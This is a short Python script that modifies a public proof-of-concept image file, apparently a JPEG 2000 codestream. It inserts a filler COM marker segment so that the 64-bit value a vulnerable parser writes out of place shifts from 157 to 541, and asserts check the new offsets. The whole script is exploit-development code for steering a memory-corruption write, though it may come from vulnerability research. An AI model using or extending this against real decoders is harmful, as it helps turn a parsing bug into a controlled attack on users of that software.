#!/usr/bin/env python3
"""Insert a benign COM marker segment before the first SOT.

The public PoC reaches the vulnerable store with
`l_current_pos` = 157 (0x9d), the byte offset of the second SOD marker.
Padding the main header shifts that stream position by the COM segment's
length.  With N=378 filler bytes the inserted segment is 2 (marker) + 2
(Lcom) + 2 (Rcom) + 378 = 384 bytes, so the written 64-bit value becomes
157 + 384 = 541 (0x21d).  No other byte of the PoC is changed.
"""
import sys

src, dst = sys.argv[1], sys.argv[2]
data = open(src, "rb").read()
sot = data.index(bytes.fromhex("ff55"))
n = 378
com = bytes.fromhex("ff64") + (4 + n).to_bytes(2, "big") + b"\x00\x00" + b"A" * n
out = data[:sot] + com + data[sot:]
assert out.index(bytes.fromhex("ff93")) == 0x202
assert len(out) == len(data) + 384
open(dst, "wb").write(out)
